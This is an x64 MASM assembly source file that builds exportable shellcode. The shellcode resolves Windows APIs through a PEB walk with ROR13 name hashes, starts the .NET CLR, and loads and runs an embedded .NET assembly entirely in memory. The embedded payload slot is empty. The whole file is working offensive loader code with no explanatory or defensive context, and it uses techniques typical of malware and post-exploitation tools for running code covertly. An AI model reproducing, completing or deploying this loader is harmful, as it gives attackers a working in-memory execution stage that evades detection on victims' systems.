include                 pe64.inc

                        .code
public getprocaddress_mshash

getprocaddress_mshash:
                        call    getprocaddress
                        ret 

public ExportShellcode
ExportShellcode:
                        mov     dword ptr[rcx], shellcode_end - shellcode
                        mov     rax, offset shellcode
                        ret
                        
shellcode:              ;int     3
                        sub     rsp, 38h
                        mov     ecx, 0EC0E4E8Eh              ;LoadLibraryA
                        call    get_api_mshash
                        mov     rbx, rax 
                        
                        lea     rcx, szmscoree
                        call    rbx
                        lea     rcx, szoleaut32
                        call    rbx
                        
                        
                        mov     ecx, 0DA8DE904h
                        call    get_api_mshash          ;CorBindToRuntime
                        
                        lea     rcx, pCorRuntimeHost
                        mov     [rsp+20h], rcx
                        lea     r9, IID_CorRuntimeHost
                        lea     r8, CLSID_CorRuntimeHost           
                        xor     edx, edx
                        lea     rcx, usnetver
                        call    rax
                        
                        mov     rcx, pCorRuntimeHost
                        mov     rax, [rcx]
                        call    qword ptr [rax+50h]             ;pCorRuntimeHost->Start();
                                               
                        mov     rcx, pCorRuntimeHost
                        mov     rax, [rcx]
                        lea     rdx, pDefaultDomain
                        call    qword ptr[rax+68h]              ;pCorRuntimeHost->GetDefaultDomain
                        
                        mov     rcx, pDefaultDomain
                        mov     rax, [rcx]
                        lea     r8, pAppDomain
                        lea     rdx, IID_AppDomain
                        call    qword ptr[rax]
                        
                        
                        mov     ecx, 066DF3906h                  ;SafeArrayCreateVector
                        call    get_api_mshash
                        
                        mov     r8d, dword ptr[dotnetbytes_size]
                        xor     edx, edx
                        mov     ecx,17                               ;VT_UI1
                        call    rax
                        mov     pRawAssembly, rax
                        
                        mov     ecx, 09F266B8Eh                      ;SafeArrayAccessData
                        call    get_api_mshash
                        
                        lea     rdx, pbytes
                        mov     rcx, pRawAssembly
                        call    rax
                        
                        mov     rdi, pbytes
                        lea     rsi, dotnetbytes
                        mov     ecx, dotnetbytes_size
                        cld
                        rep     movsb
                        
                        mov     ecx, 0AB2BF222h                      ;SafeArrayUnaccessData
                        call    get_api_mshash
                        
                        mov     rcx, pRawAssembly
                        call    rax
                        
                        
                        
                        mov     rcx, pAppDomain
                        mov     rax, [rcx]
                        lea     r8, pAssembly
                        mov     rdx, pRawAssembly
                        call    qword ptr[rax+168h]             ;pAppDomain->Load_3
                        
                        mov     rcx, pAssembly
                        mov     rax, [rcx]
                        lea     rdx, pMethod
                        call    qword ptr[rax+80h]              ;pAssembly->get_EntryPoint
                                                
                        xor     r9, r9
                        xor     r8, r8
                        lea     rdx, obj
                        mov     rcx, pMethod
                        mov     rax, [rcx]
                        call    qword ptr[rax+128h]              ;pMethidInfo->Invoke_3
                        
                        mov     ecx, 0E11676C3h
                        call    get_api_mshash
                        
                        mov     rcx, pRawAssembly
                        call    rax
                        
                        mov     rcx, pMethod
                        mov     rax, [rcx]
                        call    qword ptr[rax+10h]
                        
                        mov     rcx, pAssembly
                        mov     rax, [rcx]
                        call    qword ptr[rax+10h]
                        
                        mov     rcx, pAppDomain
                        mov     rax, [rcx]
                        call    qword ptr[rax+10h]
                        
                        mov     rcx, pDefaultDomain
                        mov     rax, [rcx]
                        call    qword ptr[rax+10h]
                        
                        mov     rcx, pCorRuntimeHost
                        mov     rax, [rcx]
                        call    qword ptr[rax+10h]
                        
                        add     rsp, 38h
                        ret
                        
                        
get_api_mshash:         push    rsi
                        push    rbx
                        push    rdi
                        mov     rbx, rcx
                        mov     rsi, qword ptr gs:[30h]
                        mov     rsi, qword ptr gs:[60h]	
                        mov     rsi, qword ptr [rsi+018h] 
                        lea     rdi, qword ptr [rsi+30h]
                        mov     rsi, qword ptr [rsi+30h]

__loop_api1:            cmp     rdi, rsi
                        je      __exit_gam
                        mov     rdx, rbx
                        mov     rcx, qword ptr[rsi+10h]                                                
                        call    getprocaddress
                        mov     rsi, qword ptr[rsi]
                        test    rax, rax
                        jz      __loop_api1
__exit_gam:
                        pop     rdi
                        pop     rbx
                        pop     rsi
                        ret     
                        
getprocaddress:         push    rsi
                        xor     rax, rax
                        test    rcx, rcx
                        jz      __exit_gpa
                        mov     r8, rcx
                        mov     r9, rdx
                        
                        mov     eax, dword ptr[r8+3ch]
                        add     rax, r8
                        mov     eax, dword ptr[rax.peheader64.pe_export]
                        test    eax, eax
                        jz      __exit_gpa
                        add     rax, r8
                        mov     r10, rax
                        
                        xor     rcx, rcx
                        mov     r11d, dword ptr[r10.export_directory.ed_addressofnames]
                        add     r11, r8

__loop_names:                        
                        mov     esi, dword ptr[r11]
                        add     rsi, r8
                            
                        xor     rax, rax
                        cdq
__get_hash:             lodsb
                        test    al, al
                        jz      __cmphash
                        ror     edx, 0dh
                        add     edx, eax
                        jmp     __get_hash
__cmphash:              cmp     r9d, edx
                        jz      __get_api
                        add     r11, 4
                        inc     ecx
                        cmp     ecx, dword ptr[r10.export_directory.ed_numberofnames]
                        jne     __loop_names
                        xor     eax, eax
                        jmp     __exit_gpa
__get_api:              mov     eax, dword ptr[r10.export_directory.ed_addressofordinals]   
                        add     rax, r8
                        movzx   eax, word ptr[rax+rcx*2]
                        mov     ecx, dword ptr[r10.export_directory.ed_addressoffunctions]
                        add     rcx, r8
                        mov     eax, dword ptr[rcx+rax*4]
                        add     rax, r8                     
__exit_gpa:             pop     rsi
                        ret             

pCorRuntimeHost         dq      ?
pAppDomain              dq      ?
pDefaultDomain          dq      ?
pAssembly               dq      ?
pMethod                 dq      ?
szmscoree               db      "mscoree.dll", 0
szoleaut32              db      "oleaut32.dll", 0
usnetver                dw      'v', '4', '.', '0', '.', '3', '0', '3', '1', '9', 0
pRawAssembly            dq      0
obj                     dq      0       ;VARIANT for obj...
                        dq      0
                        dq      0
                        dq      0

index                   dd      ?
pbytes                  dq      ?

CLSID_CorRuntimeHost    dd 0CB2F6723h           
                        dd 11D2AB3Ah
                        dd 0C000409Ch
                        dd 3E0AA34Fh

IID_CorRuntimeHost      dd 0CB2F6722h          
                        dd 11D2AB3Ah
                        dd 0C000409Ch
                        dd 3E0AA34Fh

IID_AppDomain           dd 5F696DCh             
                        dd 36632B29h
                        dd 38C48BADh
                        dd 13A7F29Ch  

shellcode_end:
                        
dotnetbytes_size        dd      dotnetbytes_end - dotnetbytes
dotnetbytes:                        

dotnetbytes_end:

                        end


